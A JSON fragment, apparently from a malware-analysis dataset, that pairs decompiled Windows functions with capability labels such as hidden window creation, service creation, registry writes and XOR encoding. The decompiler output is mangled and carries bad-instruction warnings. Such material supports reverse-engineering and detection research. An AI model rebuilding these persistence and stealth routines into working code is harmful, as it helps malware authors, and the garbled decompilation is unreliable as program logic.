        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004017b0) overlaps instruction at (ram,0x004017ae)\n// \n\nuint fcn.00401770(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint8_t extraout_CL;\n    uint8_t uVar3;\n    uint8_t extraout_CL_00;\n    uint16_t extraout_CX;\n    char extraout_DL;\n    char cVar4;\n    char extraout_DL_00;\n    uint16_t unaff_BX;\n    bool bVar5;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x411138);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    bVar5 = (unaff_BX & extraout_CX) < 0;\n    *0x4214d8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x411148);\n    if ((bVar5) || (cVar4 = extraout_DL,  uVar3 = extraout_CL,  !bVar5)) {\n        *0x4214dc = (*pcVar1)(iVar2, 0x411164);\n        cVar4 = extraout_DL_00;\n        uVar3 = extraout_CL_00;\n    }\n    *(iVar2 + -1) = *(iVar2 + -1) + cVar4;\n    *(pcVar1 + 0x4214dc) = *(pcVar1 + 0x4214dc) << (uVar3 & 0x1f);\n    *0x4214e0 = (*pcVar1)(iVar2, 0x411174);\n    if (((*0x4214d8 != 0) && (*0x4214dc != 0)) && (*0x4214e0 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 439
    },
    "00401a00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401a00(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402230(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "00401e80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401e80(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00401ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401f56) overlaps instruction at (ram,0x00401f55)\n// \n// WARNING: Removing unreachable block (ram,0x00401f53)\n\nbool fcn.00401ef0(void)\n\n{\n    uint *arg_1ch;\n    int32_t iVar1;\n    uchar *puVar2;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint auStack272 [66];\n    uint uStack8;\n    \n    puVar2 = &stack0xfffffffc;\n    arg_1ch = auStack272;\n    uStack8 = 0x104;\n    if ((&stack0xfffffffc < 0x10c || *0x10 == 0x110) || (&stack0xfffffffc >= 0x10c && *0x10 != 0x110)) {\n        arg_1ch = &uStack8;\n    }\n    else {\n        *unaff_EDI = *unaff_ESI;\n        puVar2 = 0x8de181d1;\n    }\n    iVar1 = fcn.00404f30(0x80000002, 0x411324, 0x411364, puVar2 + -8, puVar2 + -0x10c, arg_1ch);\n    if (iVar1 != 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n        iVar1 = (*_sym.imp.MSVCRT.dll__access)(puVar2 + -0x10c, 0);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 366
    },
    "00402080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004020fc) overlaps instruction at (ram,0x004020fb)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __thiscall fcn.00402080(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint8_t *puVar1;\n    uchar uVar2;\n    uint32_t uVar3;\n    char cVar4;\n    uint16_t uVar5;\n    uint32_t in_EAX;\n    uint32_t uVar6;\n    uint16_t uVar7;\n    int32_t *piVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uchar *unaff_EDI;\n    bool bVar12;\n    bool bVar13;\n    unkbyte10 extraout_ST0;\n    uint64_t uVar14;\n    unkbyte6 Var15;\n    uint uStackY40;\n    uint in_stack_ffffffdc;\n    int32_t in_stack_ffffffe0;\n    uint32_t in_stack_ffffffe4;\n    int32_t iStack12;\n    uint32_t uStack8;\n    \n    if ((*0x10 == 0xc || &stack0xfffffffc < 8) || (*0x10 != 0xc && SBORROW4(&stack0xfffffffc, 8) == &iStack12 < 0)) {\n        in_EAX = param_3 + 1U >> 1;\n        in_stack_ffffffdc = 0;\n        param_1 = param_2;\n        in_stack_ffffffe0 = param_2;\n        in_stack_ffffffe4 = in_EAX;\n    }\n    *(in_EAX + 0x8b39da56) = *(in_EAX + 0x8b39da56) ^ param_1;\n    puVar11 = &stack0xfffffffc;\n    puVar1 = (in_EAX | 0x8b) - 0x2f;\n    *puVar1 = *puVar1 | in_EAX | 0x8b;\n    func_0x00aa71f8();\n    uVar14 = fcn.004016d0(in_stack_ffffffdc, in_stack_ffffffe0, in_stack_ffffffe4);\n    uStack8 = uVar14 & 0x12000000ffff;\n    bVar12 = false;\n    bVar13 = (uVar14 & 0x12000000ffff) >> 0x20 == 0;\n    Var15 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    iStack12 = Var15;\n    iVar9 = iStack12;\n    if ((!bVar12 && !bVar13) && (bVar12 || bVar13)) {\n        iVar9 = param_2;\n    }\n    uVar3 = *(iVar9 + 0x58);\n    if (!bVar12) {\n        if (bVar12) {\n            func_0x1018806e();\n            puVar10 = &stack0xffffffdc;\n            cVar4 = '\\x04';\n            do {\n                puVar11 = puVar11 + -1;\n                puVar10 = puVar10 + -1;\n                *puVar10 = *puVar11;\n                cVar4 = cVar4 + -1;\n            } while ('\\0' < cVar4);\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    uVar5 = uVar3;\n    uVar7 = uStack8;\n    if (uVar7 < uVar5) {\n        if (!SBORROW2(uVar7, uVar5)) {\n            if (SBORROW2(uVar7, uVar5)) {\n                uVar2 = in(Var15 >> 0x20);\n                *unaff_EDI = uVar2;\n                if (uVar7 <= uVar5) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                puVar11 = &uStack8 + 3;\n                puVar1 = uStack8 + 0x66575211;\n                *puVar1 = *puVar1 >> 1 | *puVar1 << 7;\n                iVar9 = 0;\n                goto code_r0x00402183;\n            }\n        }\n        piVar8 = (uStack8 - uVar3 & 0xffff) - 1;\n    }\n    else {\n        piVar8 = uStack8 - (uVar3 & 0xffff);\n    }\n    uVar6 = uVar3 >> 0x10;\n    uVar5 = uVar3 >> 0x10;\n    uVar7 = piVar8;\n    if (uVar7 < uVar5) {\n        if ((uVar7 < uVar5) || (uVar5 <= uVar7)) {\n            piVar8 = piVar8 - uVar6;\n        }\n        *(uVar6 + 0x8316dbec) = extraout_ST0;\n        *piVar8 = *piVar8 + -0x2fd4207c;\n        iVar9 = (piVar8 & 0xffff) - 1;\n    }\n    else {\n        iVar9 = piVar8 - uVar6;\n    }\ncode_r0x00402183:\n    *puVar11[5] = iVar9 + puVar11[3];\n    *puVar11[4] = *(puVar11[-2] + 0x58);\n    return;\n}\n",
        "token_count": 1237
    },
    "00402540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "contain loop",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004025b2) overlaps instruction at (ram,0x004025ae)\n// \n\nuint __cdecl fcn.00402540(uint filename, uint mode, uint ptr, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *unaff_EDI;\n    bool bVar4;\n    char cVar5;\n    ulong uVar6;\n    \n    uVar6 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    iVar1 = uVar6;\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if ((iVar1 < 0) || (uVar3 = uVar6 >> 0x20,  iVar1 >= 0)) {\n        uVar3 = arg_14h;\n    }\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, uVar3, iVar1);\n    iVar2 = extraout_ECX;\n    do {\n        bVar4 = false;\n        cVar5 = (iVar2 - 1U & unaff_EDI | 0x61be) == 0;\n        (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n        if ((bVar4) || (!bVar4)) break;\n        iVar2 = extraout_ECX_00 + -1;\n    } while (iVar2 != 0 && cVar5 != '\\0');\n    *unaff_EDI = iVar1 + 4;\n    (*_sym.imp.MSVCRT.dll_fclose)();\n    return 1;\n}\n",
        "token_count": 380
    },
    "004036e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004036e0(uint arg_8h, uchar *arg_ch)\n\n{\n    uint uVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    bool bVar5;\n    unkbyte6 Var6;\n    \n    puVar2 = arg_ch;\n    uVar1 = arg_8h;\n    Var6 = fcn.00402080(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    uVar3 = Var6;\n    bVar5 = uVar3 == 0;\n    if (bVar5) {\n        return 0;\n    }\n    puVar4 = puVar2;\n    if ((!bVar5) && (bVar5)) {\n        uVar3 = *0x4bb148d3;\n        puVar4 = puVar2 + 1;\n        out(*puVar2, Var6 >> 0x20);\n    }\n    *(uVar3 + 0x58) = arg_ch;\n    fcn.00402080(uVar1, puVar4, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 258
    },
    "00403770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403770(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "00404ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404af3) overlaps instruction at (ram,0x00404af2)\n// \n\nvoid __cdecl fcn.00404ad0(uint32_t arg_8h, uint *arg_ch)\n\n{\n    uint32_t in_EAX;\n    uint8_t *puVar1;\n    uchar *puVar2;\n    ushort in_CX;\n    uchar in_DL;\n    uint32_t unaff_EBX;\n    uint *unaff_ESI;\n    uint *puVar3;\n    uint *puVar4;\n    ushort in_SS;\n    bool bVar5;\n    bool in_ZF;\n    bool bVar6;\n    \n    if ((!in_ZF) && (in_ZF)) {\n        arg_ch = CONCAT22(in_CX, in_SS);\n        puVar1 = in_EAX | 0x33;\n        *arg_ch = *arg_ch | in_CX;\n        *(puVar1 * 2) = in_DL;\n        bVar5 = CARRY1(*puVar1, puVar1);\n        *puVar1 = *puVar1 + puVar1;\n        bVar6 = *puVar1 == 0;\n        goto code_r0x00404af9;\n    }\n    unaff_ESI = NULL;\n    bVar5 = false;\n    bVar6 = arg_ch == NULL;\n    if (!bVar6) {\n        do {\n            unaff_EBX = arg_8h;\n            puVar3 = unaff_ESI;\n            puVar4 = arg_ch;\n            if (bVar5 || bVar6) {\ncode_r0x00404b0d:\n                puVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n            }\n            else {\ncode_r0x00404af9:\n                arg_8h = unaff_EBX;\n                puVar3 = unaff_ESI;\n                puVar4 = arg_ch;\n                if (!bVar5 && !bVar6) goto code_r0x00404b0d;\n                puVar4 = arg_ch + 1;\n                puVar3 = unaff_ESI + 1;\n                *arg_ch = *unaff_ESI;\n                arg_8h = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n                puVar2 = &stack0x004060e8;\n            }\n            *(puVar3 + arg_8h) = puVar2 % 0x1a + 'a';\n            unaff_ESI = puVar3 + 1;\n            bVar5 = unaff_ESI < puVar4;\n            bVar6 = unaff_ESI == puVar4;\n            arg_ch = puVar4;\n        } while (bVar5);\n    }\n    return;\n}\n",
        "token_count": 606
    },
    "00404b30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404b30(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t in_ECX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    iVar1 = 0;\n    if (0 < arg_14h) {\n        do {\n            bVar2 = ((in_ECX >> 8 ^ arg_14h >> 8) + 1 & 0x27) != 0;\n            if ((bVar2) && (!bVar2)) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            in_ECX = in_ECX & 0xff00;\n            *(iVar1 + arg_10h) = arg_14h ^ *(iVar1 + arg_10h) ^ *(iVar1 % arg_ch + arg_8h);\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 235
    },
    "00401eb0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401eb0(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00401f80": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401f80(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x411040, 0x4214ec, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 139
    },
    "00404fe0": {
        "rules": [
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00405028) overlaps instruction at (ram,0x00405025)\n// \n\nuint __cdecl fcn.00404fe0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    bVar2 = iVar1 == 0;\n    if (!bVar2) {\n        if ((bVar2) || (!bVar2)) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 198
    },
    "00401ae0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00401ae0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x41120c, 0x411250, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 79
    }
}